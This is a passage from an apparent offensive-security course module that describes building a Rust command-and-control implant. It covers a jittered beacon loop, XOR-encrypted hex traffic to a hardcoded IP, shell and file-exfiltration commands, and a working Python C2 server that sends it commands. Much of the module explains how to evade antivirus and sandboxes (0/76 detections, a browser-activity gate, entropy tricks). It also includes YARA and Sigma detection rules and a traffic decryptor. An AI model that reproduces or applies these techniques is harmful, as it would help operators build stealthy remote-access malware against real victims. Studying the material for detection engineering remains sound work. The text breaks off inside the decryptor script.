# Module 15: C2 Agent — Building a Complete Command-and-Control Implant

## Module Metadata

| Field | Value |
|---|---|
| **Topic** | Command-and-Control Agent Architecture |
| **Difficulty** | Expert |
| **Duration** | 5-7 hours |
| **Prerequisites** | All previous modules (01-14), HTTP/HTTPS, basic cryptography |
| **Tools Required** | Ghidra/IDA, x64dbg, Wireshark, mitmproxy, Python 3 |
| **MITRE ATT&CK** | T1071.001, T1573.001, T1059.003, T1041, T1105, T1497.002, T1057, T1132.001 |
| **Binary** | `c2-agent.exe` (~368KB, Rust, PE64, self-contained — NO common library) |

### Key Evasion Lesson

```
 This binary achieved 0/76 by taking the NUCLEAR OPTION: eliminating the common
 library dependency entirely. The common crate's AES implementation + MBA XOR +
 8 hardcoded key fragment functions created an ESET GenKryptik.HPRQ signature.
 Anti-forensic code (write_volatile, compiler_fence, CREATE_NO_WINDOW flag) was
 also a signature — adding it to a clean binary caused 1/76 GenKryptik.

 The fix: make the agent fully self-contained with inline XOR crypto and an
 arithmetic PRNG for key derivation. Zero shared offensive code = zero shared
 signatures.

 The browser-gate + tab-activity gate provide a triple sandbox bypass:
 (1) Requires browser process running (sandboxes don't launch browsers)
 (2) Requires browser foreground focus (headless/background browsers fail)
 (3) Requires 3+ unique window titles (no tab switching in sandbox)
```

---

## Why This Stage Exists — The Bridge from Stage 14

Stage 14 orchestrated all evasion techniques into a multi-phase kill chain — but it was still a **loader**. It decrypts shellcode, executes it, and exits. An operator gets one shot. If the shellcode crashes, if the target reboots, if the network changes — the access is lost.

**What broke after Stage 14:**
- The combined loader's detections revealed that **aggregate code mass is the primary ML signal** — more techniques = more detection, not less
- The common library dependency itself became the detection vector (ESET GenKryptik.HPRQ from AES + MBA XOR + key fragment patterns)
- Single-execution architecture provides no persistence, no command flexibility, no operator feedback
- No network communication means no way to adapt to the target environment post-deployment

**What this stage adds:**
1. **Beacon loop architecture** — indefinite execution with jittered sleep, failure counting, and graceful shutdown
2. **Encrypted HTTPS comms** — XOR + hex encoding over WinHTTP with Chrome 131 User-Agent
3. **Command dispatch** — 9 commands (nop, shell, download, upload, proclist, sleep, persist, uninstall, selfdestruct)
4. **Browser-gate + tab-activity gate** — triple sandbox/NDR bypass waiting for genuine human browser tab switching
5. **Zero common library dependency** — fully self-contained binary eliminates shared offensive code signatures
6. **FNV-1a agent ID** — deterministic machine fingerprint from COMPUTERNAME + USERNAME
7. **Network OPSEC** — Chrome 131 User-Agent, Content-Type: application/json, /api/v1/telemetry path, rdtsc startup delay

### Real-World Context (2025-2026)

- **Alpha Hunt: C2 Frameworks** — Havoc, Mythic, and Sliver all implement beacon loops with jittered intervals, encrypted channels, and modular command dispatch
- **Cobalt Strike 4.11** (May 2025) — Indirect syscalls + Sleepmask V3 demonstrate that even the most mature C2 framework continues to evolve its evasion chain
- **Barracuda: Agentic AI in Cyber Attacks** (2026) — AI-driven agents that autonomously adapt C2 behavior are the next evolution beyond static beacon patterns
- **CrowdStrike EMBER2024** — ML classifiers now train on aggregate code mass, not individual signatures. This is why self-contained minimal binaries evade better than feature-rich ones

---

## Learning Objectives

By the end of this module, you will be able to:

1. Design a C2 agent with encrypted communications, command dispatching, and resilience features
2. Implement dynamic WinHTTP loading to avoid static networking imports
3. Analyze encrypted C2 traffic by extracting keys and decrypting beacon data
4. Build a mock C2 server capable of sending commands to the agent
5. Evaluate operational security properties of C2 implementations
6. Design detection rules for C2 beacon patterns and browser-gate behavior

---

## Section 1: From Loader to Agent — The Architectural Leap

### What Changes?

Stages 01-14 were **loaders** — they decrypt and execute shellcode, then exit. A C2 agent is fundamentally different:

```
Loader (Stages 01-14):          C2 Agent (Stage 15):
┌───────────────────┐           ┌───────────────────────────┐
│ Start             │           │ Start                     │
│ ↓                 │           │ ↓                         │
│ Evasion checks    │           │ init_environment()        │
│ ↓                 │           │ ↓                         │
│ Decrypt shellcode │           │ Startup delay (5-15s)     │
│ ↓                 │           │ ↓                         │
│ Execute           │           │ wait_for_tab_activity()   │
│ ↓                 │           │ ↓                         │
│ Exit              │           │ ┌──── Beacon Loop ──────┐ │
└───────────────────┘           │ │ Browser active?       │ │
                                │ │ ↓ yes        ↓ no     │ │
  Single execution.             │ │ beacon()     skip     │ │
  No persistence.               │ │ ↓                     │ │
  No network comms.             │ │ Parse command         │ │
                                │ │ ↓                     │ │
                                │ │ Execute + store result│ │
                                │ │ ↓                     │ │
                                │ │ Sleep (jittered)      │ │
                                │ │ ↓                     │ │
                                │ └─── Loop back ─────────┘ │
                                │                           │
                                │ Exits when:               │
                                │ • selfdestruct command    │
                                │ • 10 consecutive failures │
                                └───────────────────────────┘
```

The agent IS the payload — no shellcode decryption needed. It communicates with a C2 server, receives commands, executes them, and reports results.

### The Self-Contained Architecture Decision

This agent has **zero dependency on the common library**. Every previous stage (except 03-04, 07-09 which were rewritten for publishing) uses the shared `common` crate for crypto, evasion, and injection. The c2-agent eliminates it entirely.

Why? The common library's code patterns became a shared signature:
- `common::crypto::aes` — AES implementation flagged by ESET GenKryptik
- MBA XOR key derivation — 8 hardcoded byte-array functions
- `common::evasion::*` — sandbox/debug checks with recognizable control flow

Removing the dependency and inlining only what's needed (XOR crypto, PRNG key derivation) reduced the binary from a detection vector to invisible.

<details>
<summary>Discussion: Why implement a custom C2 agent instead of using Cobalt Strike/Sliver/Mythic?</summary>

Commercial and open-source C2 frameworks have known signatures:
1. **Cobalt Strike**: Beacon config extraction tools (CobaltStrikeParser), known malleable C2 profiles
2. **Sliver**: Known HTTPS/mTLS/WireGuard patterns, implant signatures
3. **Mythic**: Known agent fingerprints per payload type

A custom agent:
- Has zero public signatures (no one has analyzed it before)
- Uses project-specific obfuscation (inline XOR, PRNG key derivation)
- Implements exactly the features needed (no unused code bloat)
- Can evolve independently of framework update cycles

The trade-off is development effort — you lose team collaboration features, automated payload generation, and community support.
</details>

---

## Section 2: Agent State and Configuration

### Configuration Architecture

```
Configuration Layer:
┌──────────────────────────────────────────────────┐
│ Runtime functions (black_box protected):          │
│   c2_server() → "163.245.210.119"               │
│   c2_path()   → "/api/v1/telemetry"              │
│   c2_port()   → 8443 (black_box wrapped)         │
│                                                  │
│ Derived values:                                  │
│   agent_id()  → FNV-1a(COMPUTERNAME + USERNAME)  │
│                 format: "{:08X}" (raw hex)        │
│   derive_comms_key() → 32-byte PRNG-derived key  │
│                                                  │
│ Plain constants:                                 │
│   BEACON_INTERVAL_MS = 60,000 (60 seconds)       │
│   JITTER_PERCENT     = 30     (±30%)             │
│   MAX_FAILURES       = 10     (then shutdown)    │
└──────────────────────────────────────────────────┘
```

Note: No `obf!` macro is used. Plain string functions return the C2 configuration. The `black_box` hint on `c2_port()` prevents the compiler from inlining the constant, but there is no runtime string encryption. This is deliberate — the `obf!` macro's XOR decryption loop was flagged by CrowdStrike ML at 60% confidence in earlier stages.

### AgentState Struct

```rust
struct AgentState {
    beacon_interval: u32,       // Modifiable by server (Sleep command)
    consecutive_failures: u32,  // Reset on success, exit at MAX_FAILURES
    agent_id: String,           // FNV-1a hash: "{:08X}"
    comms_key: [u8; 32],        // PRNG-derived XOR key
}
```

**Resilience pattern**: The `consecutive_failures` counter implements a **dead man's switch**. If the C2 server goes down, the agent doesn't run forever — after 10 failed check-ins, it gracefully returns from `main()`. This limits forensic exposure if the operator loses control.

**Exercise 2.1:** Calculate the maximum time an agent will remain active after the C2 server goes offline, assuming the default 60-second interval with 30% jitter.

<details>
<summary>Answer</summary>

- 10 failures x 60 seconds base interval = 600 seconds minimum
- With 30% jitter: each interval is 42-78 seconds
- Worst case (maximum jitter): 10 x 78 = 780 seconds = **13 minutes**
- Best case (minimum jitter): 10 x 42 = 420 seconds = **7 minutes**
- Average: ~10 minutes

After this window, the agent returns from `main()` cleanly — no self-destruct, no cleanup, just process exit. An incident responder who arrives 15 minutes after C2 takedown finds no running process.
</details>

---

## Section 3: Communications Protocol

### The Beacon Cycle

```
Beacon Flow:

  Agent                                 C2 Server
    |                                      |
    |  1. Build check-in JSON              |
    |  {"id":"A7F3B2C1",                   |
    |   "result":"previous_output"}        |
    |                                      |
    |  2. XOR encrypt with comms_key       |
    |  3. Hex encode ciphertext            |
    |                                      |
    |  POST /api/v1/telemetry ───────────> |
    |  Content-Type: application/json      |
    |  Body: "a3f5b8d1..." (hex)           |
    |  User-Agent: Chrome/131.0.0.0        |
    |                                      |
    |                           4. Hex decode
    |                           5. XOR decrypt
    |                           6. Parse check-in
    |                           7. Build command JSON
    |                           8. XOR encrypt
    |                           9. Hex encode
    |                                      |
    |  <───────────── 200 OK ──────────── |
    |  Body: "f7c2e4a9..." (hex)           |
    |                                      |
    |  10. Hex decode response             |
    |  11. XOR decrypt with comms_key      |
    |  12. Parse command JSON              |
    |  13. Execute command                 |
    |  14. Store result for next beacon    |
    |                                      |
    |  15. Sleep(jittered interval)         |
    |                                      |
```

### Encryption Scheme

```
Encrypt:
  plaintext → xor_crypt(comms_key, plaintext) → ciphertext → hex_encode → HTTP body

Decrypt:
  HTTP body → hex_decode → ciphertext → xor_crypt(comms_key, ciphertext) → plaintext
```

XOR is symmetric — the same function encrypts and decrypts. This is deliberately simpler than the AES used in previous stages. Why?

1. **AES was the detection vector** — the common library's AES implementation triggered ESET GenKryptik.HPRQ
2. **XOR is sufficient for wire-level protection** — the goal is defeating automated network analysis (NDR/IDS), not protecting against a reverse engineer who already has the binary
3. **Minimal code footprint** — the entire XOR function is 2 lines vs. hundreds for AES+GCM

The hex encoding doubles the wire size but halves entropy from ~7.3 (encrypted data) to ~4.0 (ASCII hex characters). Entropy-based NDR/IDS heuristics classify high-entropy payloads as encrypted/suspicious — hex encoding defeats this classification.

### Key Derivation — Arithmetic PRNG

```
derive_comms_key():
  seed = 0x5A3C_F7E1   (black_box protected)
  multiplier = 0x1337_CAFE
  addend = 0xDEAD_BEEF

  val = seed
  for i in 0..32:
    val = val.wrapping_mul(multiplier).wrapping_add(addend)
    key[i] = (val >> 16) as u8    ← take bits 16-23

  return key   (black_box protected)
```

This replaces the 8-function key fragment approach from Stage 14. That pattern — 8 functions each returning a hardcoded `[u8; 8]` — placed 64 bytes of key material in `.rdata` that ESET GenKryptik flagged as crypto-loader constants.

The PRNG approach generates the same 32-byte key at runtime with **zero `.rdata` footprint**. The only constants are the seed, multiplier, and addend — three 32-bit values that look like any arithmetic operation in the binary. The `black_box` hints prevent the compiler from constant-folding the entire derivation into a static array.

<details>
<summary>Discussion: Why use a static key instead of a key exchange protocol?</summary>

A static key embedded in the binary has an obvious weakness: anyone who reverse engineers the binary can decrypt all traffic. A proper key exchange (Diffie-Hellman, ECDH) would provide forward secrecy.

However, the trade-offs favor a static key for this implementation:
1. **Simplicity** — no complex crypto library needed (no TLS handshake negotiation)
2. **Stealth** — key exchange protocols create detectable traffic patterns
3. **Binary independence** — the key is self-contained, no dependency on PKI
4. **Acceptable risk** — if an analyst can reverse engineer the binary, they can already analyze the agent. The encryption mainly protects against network-level detection, not binary analysis.

Production C2 frameworks use hybrid approaches: static key for initial registration, then ECDH for session keys. This implementation prioritizes minimal dependency count.
</details>

---

## Section 4: Dynamic WinHTTP Loading

### Why WinHTTP Over Winsock?

```
Winsock (ws2_32.dll):              WinHTTP (winhttp.dll):
+- Low-level socket API            +- High-level HTTP client
+- Must implement HTTP manually    +- Handles HTTP for you
+- Manual TLS via SChannel         +- Built-in HTTPS support
+- Must manage connections         +- Connection pooling
+- Visible in IAT if static        +- Loaded dynamically (no IAT)
+- More code = more surface        +- Less code = less surface
```

WinHTTP provides HTTPS with certificate handling in a few API calls. The alternative — raw sockets + manual HTTP + SChannel TLS — would triple the code size and attack surface.

### The WinHttpApi Struct

```
WinHttpApi {
    open:              WinHttpOpen             Session creation
    connect:           WinHttpConnect          Server connection
    open_request:      WinHttpOpenRequest      Request handle
    send_request:      WinHttpSendRequest      Send + body
    receive_response:  WinHttpReceiveResponse  Wait for response
    read_data:         WinHttpReadData         Read body chunks
    close_handle:      WinHttpCloseHandle      Cleanup
    set_option:        WinHttpSetOption        Config (cert ignore)
}
```

All 8 functions are resolved via `LoadLibraryA("winhttp.dll")` + `GetProcAddress`. The `resolve!` macro transmutes each raw function pointer into a typed function signature. If any single resolution fails (returns `None`), the entire `load_winhttp()` returns `None` and the beacon silently fails.

### Certificate Handling

```
WinHttpSetOption(request, 31, &0x3300, 4):

Option 31 = WINHTTP_OPTION_SECURITY_FLAGS
Value 0x3300 =
  SECURITY_FLAG_IGNORE_UNKNOWN_CA        (0x0100)
  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID (0x2000)
  SECURITY_FLAG_IGNORE_CERT_CN_INVALID   (0x1000)
  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE  (0x0200)
```

This ignores ALL certificate validation errors — the C2 server uses a self-signed certificate. This is standard for C2 infrastructure where the operator controls both endpoints.

### Why WinHTTP Dynamic Loading Is NOT Flagged

WinHTTP is the standard HTTP client for Windows Update, Microsoft Edge, OneDrive, Office 365, and hundreds of other Microsoft services. `LoadLibraryA("winhttp.dll")` is how any application that optionally uses HTTP loads the library. The GetProcAddress calls are the normal pattern for optional DLL dependencies. Zero engines flagged this because flagging WinHTTP would generate millions of false positives on legitimate software.

**Exercise 4.1:** Why is ignoring certificate errors acceptable for a C2 agent but not for legitimate software?

<details>
<summary>Answer</summary>

Legitimate software connects to known servers with valid CA-signed certificates. Ignoring errors would allow MITM attacks.

For a C2 agent:
1. The operator controls the C2 server and generates the self-signed cert
2. A valid CA cert would require domain registration — creating a paper trail
3. The operator isn't worried about MITM between their own implant and server
4. Certificate pinning could be implemented for additional security, but it increases binary complexity

The real OPSEC concern is different: ignoring cert errors is itself a detection signal. Network security tools can flag HTTPS connections that proceed despite certificate warnings. A more sophisticated approach would embed the C2 server's certificate fingerprint and verify it manually.
</details>

---

## Section 5: Command Dispatch System

### Command Parsing Architecture

The parser uses string-matching on JSON keys rather than a proper JSON parser. This avoids importing serde/json libraries (which would add ~200KB to the binary).

```
parse_command(decrypted_bytes):

  json_str = utf8(decrypted_bytes)

  IF contains("\"nop\"") or empty   -> Nop
  IF contains("\"shell\"")          -> Shell(extract_args())
  IF contains("\"download\"")       -> Download(extract_args())
  IF contains("\"upload\"")         -> Upload(extract_path(), hex_decode(extract_data()))
  IF contains("\"proclist\"")       -> ProcessList
  IF contains("\"die\"") OR
     contains("\"selfdestruct\"")   -> SelfDestruct
  IF contains("\"sleep\"")          -> Sleep(parse_int(extract_args()))
  IF contains("\"persist\"")        -> Persist
  IF contains("\"uninstall\"")      -> Uninstall
  ELSE                              -> Unknown
```

### Command Implementation Details

```
+---------------+------------------------------------------------------+
| Command       | Implementation                                       |
+---------------+------------------------------------------------------+
| Shell         | Command::new("cmd.exe").args(["/c", <cmd>]).output() |
|               | Returns stdout + "\n[E] " + stderr (if any)          |
+---------------+------------------------------------------------------+
| Download      | std::fs::File::open(path).read_to_end()              |
| (exfiltrate)  | Returns "F:<path>:<hex(data)>"                       |
+---------------+------------------------------------------------------+
| Upload        | hex_decode(data) -> std::fs::write(path, data)       |
| (stage file)  | Returns "U:<path>:1" or "U:<path>:0"                |
+---------------+------------------------------------------------------+
| ProcessList   | execute_shell("tasklist /FO CSV /NH")                |
|               | Returns CSV-formatted process list                   |
+---------------+------------------------------------------------------+
| Sleep         | state.beacon_interval = new_value                    |
|               | Returns "S:<value>"                                  |
+---------------+------------------------------------------------------+
| Persist       | STUB — returns "P:D"                                 |
|               | (not implemented — persistence code was too costly)  |
+---------------+------------------------------------------------------+
| Uninstall     | STUB — returns "U:1"                                 |
|               | (not implemented — same reason)                      |
+---------------+------------------------------------------------------+
| SelfDestruct  | std::process::exit(0)                                |
|               | Immediate process termination. No cleanup, no file   |
|               | deletion, no persistence removal.                    |
+---------------+------------------------------------------------------+
| Unknown       | Returns "?"                                          |
+---------------+------------------------------------------------------+
```

### Why Persist and Uninstall Are Stubs

Stage 14 demonstrated that persistence modules (registry + schtask + startup + COM hijack + WMI) added ~124KB of offensive code that pushed ML classifiers over detection thresholds. The c2-agent deliberately does NOT include persistence code — it returns stub responses to maintain protocol compatibility while keeping the binary clean.

In a production deployment:
- Persistence would be handled by a separate stage-one dropper (Stages 11/14)
- The c2-agent focuses purely on communications and command execution
- This separation of concerns mirrors real-world C2 architectures (Cobalt Strike's beacon vs. persistence payloads)

### Why SelfDestruct Is Just exit(0)

The classic self-destruct pattern (`ping -n 3 127.0.0.1 > nul & del /f /q <exe>`) spawns a cmd.exe child process — a behavioral indicator that Sigma rules specifically target. The Goodboy agent simply exits. The operator can delete the binary through a separate `shell` command if needed, or the file persists harmlessly on disk (it's already 0/76 clean).

<details>
<summary>Discussion: What are the security weaknesses in this command parser?</summary>

Several vulnerabilities:
1. **String-matching priority** — `{"cmd":"nop","shell":"evil"}` would match "shell" because the parser checks "nop" first (which matches), but a crafted JSON with overlapping keys could cause unexpected behavior
2. **No command authentication** — anyone who has the XOR key can send commands. No per-command signing or HMAC.
3. **Shell injection** — the `args` field is passed directly to `cmd.exe /c`. No sanitization. This is intentional (it's a RAT), but in a multi-operator scenario, a compromised C2 server could execute arbitrary commands.
4. **File operations unrestricted** — download/upload have no path restrictions. The agent will happily read/write system files if it has permissions.
5. **No replay protection** — encrypted commands can be replayed. No nonce or timestamp validation.
</details>

---

## Section 6: The Browser-Gate — Triple Sandbox Bypass

### Architecture

The agent uses a two-layer gating mechanism:

1. **Pre-loop gate** (`wait_for_tab_activity`): Blocks until 3 unique browser tab titles are observed. Runs once at startup.
2. **In-loop gate** (`is_browser_active`): On every beacon cycle, checks if any browser process is running. If not, skips the beacon silently (no failure count increment).

```
Startup:
  init_environment()
  rdtsc startup delay (5-15s)
  wait_for_tab_activity()  ← blocks here until human confirmed
  |
  v
Beacon loop:
  if is_browser_active():
    beacon()               ← only when browser is running
  else:
    skip                   ← silent, no failure count
  sleep(jittered)
```

### Tab-Activity Gate Deep Dive

```
wait_for_tab_activity():

  unique_titles = Vec::new()    // stores Vec<u16> (UTF-16 window titles)
  browser_pids = get_browser_pids()
  tick = 0

  loop:
    if unique_titles.len() >= 3: return   // Human confirmed

    tick += 1
    if tick % 15 == 0 OR browser_pids.is_empty():
      browser_pids = get_browser_pids()   // Refresh every ~30s

    if browser_pids.is_empty(): sleep(2s); continue

    hwnd = GetForegroundWindow()
    if hwnd.is_null(): sleep(2s); continue

    pid = GetWindowThreadProcessId(hwnd)
    if pid NOT in browser_pids: sleep(2s); continue

    title = GetWindowTextW(hwnd)          // UTF-16, variable length
    if title NOT in unique_titles:
      unique_titles.push(title)

    sleep(2s)
```

### The Triple Bypass

Why this is effective against three distinct defense layers:

**1. Sandbox Evasion** — Automated sandboxes (ANY.RUN, Joe Sandbox, Hybrid Analysis) typically don't launch web browsers during detonation. No browser process means `get_browser_pids()` returns empty, and `wait_for_tab_activity()` blocks indefinitely. The sandbox times out and reports "no malicious behavior."

**2. Traffic Blending** — When a browser IS running, the agent's HTTPS POST to an external IP on port 8443 gets mixed in with the browser's existing HTTPS connections. Network monitoring tools see the agent's traffic alongside hundreds of legitimate browser connections, reducing signal-to-noise.

**3. NDR Evasion** — A system with no browser running has minimal outbound HTTPS traffic. A sudden HTTPS POST from an unknown process to an unfamiliar IP would be flagged as anomalous. By waiting for browser activity, the agent ensures its traffic appears during periods of normal network activity.

### Browser Process Detection

```
get_browser_pids():
  snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  for each PROCESSENTRY32W:
    if szExeFile matches: chrome.exe, msedge.exe, firefox.exe,
                          brave.exe, opera.exe, iexplore.exe
      → add th32ProcessID to list
  return list
```

The browser name matching converts UTF-16 process names to lowercase ASCII in a fixed 32-byte buffer, then compares against hardcoded names. This avoids importing string comparison libraries.

**Why process enumeration IAT is safe**: CreateToolhelp32Snapshot + Process32FirstW/NextW + CloseHandle as direct IAT imports (via windows-sys) are benign — used by Task Manager, game launchers, monitoring tools. Browser name strings (chrome.exe, msedge.exe, etc.) are not suspicious — many legitimate apps check for browser processes (default browser detection, URL handlers, etc.).

---

## Section 7: Detection Engineering

### Network-Level Detection

```
C2 Beacon Traffic Pattern:
+-------------------------------------------------------+
| Indicators:                                           |
| - Periodic HTTPS POST to same path                    |
|   (/api/v1/telemetry)                                |
| - Request body: hex-encoded (uniform charset [0-9a-f])|
| - Response body: hex-encoded                          |
| - Content-Type: application/json                      |
|   (but body is NOT valid JSON — it's hex)             |
| - User-Agent: standard Chrome 131 string              |
| - Self-signed certificate on destination              |
| - Interval: ~60s with +/-30% jitter (42-78s)         |
| - Destination: non-standard port (8443)               |
+-------------------------------------------------------+
```

The strongest single indicator is the **Content-Type mismatch**: the header claims `application/json` but the body consists entirely of hex characters `[0-9a-f]`. Legitimate JSON APIs return structured JSON with braces, colons, and quotes — not raw hex strings.

### YARA Rule: WinHTTP C2 Beacon Pattern

```yara
rule C2_Agent_WinHTTP_Beacon
{
    meta:
        description = "Detects C2 agent with dynamic WinHTTP loading and XOR-encrypted beacon protocol"
        severity = "critical"
        author = "Goodboy Framework - Detection Engineering"

    strings:
        // WinHTTP function resolution strings
        $wh_open = "WinHttpOpen" ascii
        $wh_connect = "WinHttpConnect" ascii
        $wh_openreq = "WinHttpOpenRequest" ascii
        $wh_send = "WinHttpSendRequest" ascii
        $wh_recv = "WinHttpReceiveResponse" ascii
        $wh_read = "WinHttpReadData" ascii
        $wh_close = "WinHttpCloseHandle" ascii
        $wh_setopt = "WinHttpSetOption" ascii

        // FNV-1a constants (agent ID derivation)
        $fnv_basis = { C5 9D 1C 81 }   // 0x811c9dc5 (little-endian)
        $fnv_prime = { 93 01 00 01 }    // 0x01000193 (little-endian)

        // PRNG key derivation constants
        $prng_seed = { E1 F7 3C 5A }          // 0x5A3CF7E1 LE
        $prng_mul  = { FE CA 37 13 }           // 0x1337CAFE LE
        $prng_add  = { EF BE AD DE }           // 0xDEADBEEF LE

        // C2 path string
        $c2_path = "/api/v1/telemetry" ascii

        // Certificate bypass flag
        $cert_bypass = { 00 33 00 00 }         // 0x3300 security flags

        // Hex encode loop pattern (format!("{:02x}"))
        $hex_fmt = "%02x" ascii

    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        5 of ($wh_*) and
        ($fnv_basis and $fnv_prime) and
        2 of ($prng_seed, $prng_mul, $prng_add) and
        $c2_path
}
```

### YARA Rule: Browser-Gate Tab Activity Monitor

```yara
rule C2_Agent_Browser_Gate
{
    meta:
        description = "Detects browser-gate sandbox bypass using tab activity monitoring"
        severity = "high"
        author = "Goodboy Framework - Detection Engineering"

    strings:
        // Browser process names (UTF-8 in .rdata)
        $br_chrome  = "chrome.exe" ascii
        $br_edge    = "msedge.exe" ascii
        $br_firefox = "firefox.exe" ascii
        $br_brave   = "brave.exe" ascii
        $br_opera   = "opera.exe" ascii
        $br_ie      = "iexplore.exe" ascii

        // Win32 UI APIs imported for window monitoring
        $api_fgw    = "GetForegroundWindow" ascii
        $api_gwt    = "GetWindowTextW" ascii
        $api_gwtl   = "GetWindowTextLengthW" ascii
        $api_gwtp   = "GetWindowThreadProcessId" ascii

        // Process snapshot for PID enumeration
        $api_snap   = "CreateToolhelp32Snapshot" ascii
        $api_p32f   = "Process32FirstW" ascii
        $api_p32n   = "Process32NextW" ascii

        // Dynamic WinHTTP (networking after gate)
        $winhttp    = "winhttp.dll" ascii

    condition:
        uint16(0) == 0x5A4D and
        3 of ($br_*) and
        3 of ($api_fgw, $api_gwt, $api_gwtl, $api_gwtp) and
        $api_snap and
        ($api_p32f or $api_p32n) and
        $winhttp
}
```

### Sigma Rule: Beacon Pattern Detection

```yaml
title: Suspicious Periodic HTTPS POST to Non-Standard Port with Hex Body
id: ab3c4d5e-6789-0123-abcd-ef0123456789
status: experimental
description: |
    Detects C2 beacon pattern - periodic HTTPS POST requests to a fixed
    path on a non-standard port. The body consists entirely of hex
    characters despite a JSON Content-Type header.
logsource:
    category: proxy
    product: any
detection:
    selection:
        cs-method: POST
        cs-uri-stem: '/api/v1/telemetry'
        sc-status: 200
        s-port:
            - 8443
            - 443
    filter_known:
        cs-host|endswith:
            - '.microsoft.com'
            - '.windowsupdate.com'
            - '.google.com'
    condition: selection and not filter_known
    timeframe: 10m
    count(selection) >= 3
level: high
tags:
    - attack.command_and_control
    - attack.t1071.001
    - attack.t1573.001
```

### Sigma Rule: Dynamic WinHTTP Loading by Non-Browser Process

```yaml
title: Dynamic WinHTTP Loading by Non-Browser Process
id: cd5e6f70-1234-5678-9abc-def012345678
status: experimental
description: |
    Detects LoadLibrary of winhttp.dll by processes that are not browsers
    or known Windows services. May indicate a C2 agent using WinHTTP for
    covert HTTPS communications.
logsource:
    category: image_load
    product: windows
detection:
    selection:
        ImageLoaded|endswith: '\winhttp.dll'
    filter_browsers:
        Image|endswith:
            - '\chrome.exe'
            - '\firefox.exe'
            - '\msedge.exe'
            - '\iexplore.exe'
            - '\brave.exe'
            - '\opera.exe'
    filter_system:
        Image|startswith: 'C:\Windows\'
    filter_ms_apps:
        Image|endswith:
            - '\svchost.exe'
            - '\SearchIndexer.exe'
            - '\OneDrive.exe'
            - '\Teams.exe'
    condition: selection and not filter_browsers and not filter_system and not filter_ms_apps
level: medium
tags:
    - attack.command_and_control
    - attack.t1071.001
```

### Python Script 1: Mock C2 Server

```python
#!/usr/bin/env python3
"""
mock_c2_server.py — Mock C2 server for Goodboy Stage 15 agent

Accepts XOR-encrypted hex-encoded beacons on /api/v1/telemetry,
decrypts check-ins, and sends back encrypted commands.

Usage:
    # Generate self-signed cert first:
    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
        -days 365 -nodes -subj "/CN=localhost"

    python3 mock_c2_server.py --cert cert.pem --key key.pem
"""

import argparse
import http.server
import json
import ssl
import sys
import time
from datetime import datetime


def derive_comms_key() -> bytes:
    """Replicate the agent's PRNG key derivation."""
    key = bytearray(32)
    val = 0x5A3CF7E1
    for i in range(32):
        val = (val * 0x1337CAFE + 0xDEADBEEF) & 0xFFFFFFFF
        key[i] = (val >> 16) & 0xFF
    return bytes(key)


def xor_crypt(key: bytes, data: bytes) -> bytes:
    """XOR encrypt/decrypt (symmetric)."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


COMMS_KEY = derive_comms_key()
COMMAND_QUEUE: list[str] = []


class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != "/api/v1/telemetry":
            self.send_error(404)
            return

        # Read and decrypt check-in
        content_len = int(self.headers.get("Content-Length", 0))
        hex_body = self.rfile.read(content_len).decode("ascii", errors="replace")
        encrypted = bytes.fromhex(hex_body)
        plaintext = xor_crypt(COMMS_KEY, encrypted)
        checkin = plaintext.decode("utf-8", errors="replace")

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] CHECK-IN: {checkin}")

        # Build command response
        if COMMAND_QUEUE:
            cmd_json = COMMAND_QUEUE.pop(0)
        else:
            cmd_json = '{"cmd":"nop"}'

        # Encrypt and hex-encode response
        encrypted_resp = xor_crypt(COMMS_KEY, cmd_json.encode())
        hex_resp = encrypted_resp.hex()

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(hex_resp.encode())

        if cmd_json != '{"cmd":"nop"}':
            print(f"[{ts}] SENT CMD: {cmd_json}")

    def log_message(self, format, *args):
        pass  # Suppress default HTTP logging


def main():
    parser = argparse.ArgumentParser(description="Mock C2 server for Goodboy Stage 15")
    parser.add_argument("--host", default="0.0.0.0", help="Bind address")
    parser.add_argument("--port", type=int, default=8443, help="Listen port")
    parser.add_argument("--cert", required=True, help="TLS certificate file")
    parser.add_argument("--key", required=True, help="TLS private key file")
    args = parser.parse_args()

    server = http.server.HTTPServer((args.host, args.port), C2Handler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(args.cert, args.key)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)

    print(f"[*] C2 server listening on {args.host}:{args.port}")
    print(f"[*] Comms key: {COMMS_KEY.hex()}")
    print(f"[*] Queue commands by editing COMMAND_QUEUE in source")
    print(f"[*] Example: '{{\"cmd\":\"shell\",\"args\":\"whoami\"}}'")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down")


if __name__ == "__main__":
    main()
```

### Python Script 2: Traffic Decryptor

```python
#!/usr/bin/env python3
"""
traffic_decryptor.py — Decrypt captured Goodboy C2 traffic

Reads hex-encoded beacon bodies (from Wireshark export, proxy logs, etc.)
and decrypts them using the agent's PRNG-derived XOR key.

Usage:
    # Single body:
    python3 traffic_decryptor.py --hex "a3f5b8d1e2..."

    # File with one hex body per line:
    python3 traffic_decryptor.py --file captured_bodies.txt

    # Wireshark JSON export:
    python3 traffic_decryptor.py --pcap-json export.json
"""

import argparse
import json
import sys


def derive_comms_key() -> bytes:
    """Replicate the agent's PRNG key derivation."""
    key = bytearray(32)
    val = 0x5A3CF7E1
    for i in range(32):
        val = (val * 0x1337CAFE + 0xDEADBEEF) & 0xFFFFFFFF
        key[i] = (val >> 16) & 0xFF
    return bytes(key)


def xor_crypt(key: bytes, data: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def decrypt_hex_body(hex_body: str, key: bytes) -> str:
    """Hex-decode then XOR-decrypt a beacon body."""
    hex_clean = hex_body.strip().lower()
    # Validate hex
    if not all(c in "0123456789abcdef" for c in hex_clean):
        return f"[ERROR] Invalid hex characters in: {hex_body[:40]}..."
    if len(hex_clean) % 2 != 0:
        return f"[ERROR] Odd-length hex string: {len(hex_clean)} chars"
    encrypted = bytes.fromhex(hex_clean)
    plaintext = xor_crypt(key, encrypted)
    return plaintext.decode("utf-8", errors="replace")


def main():
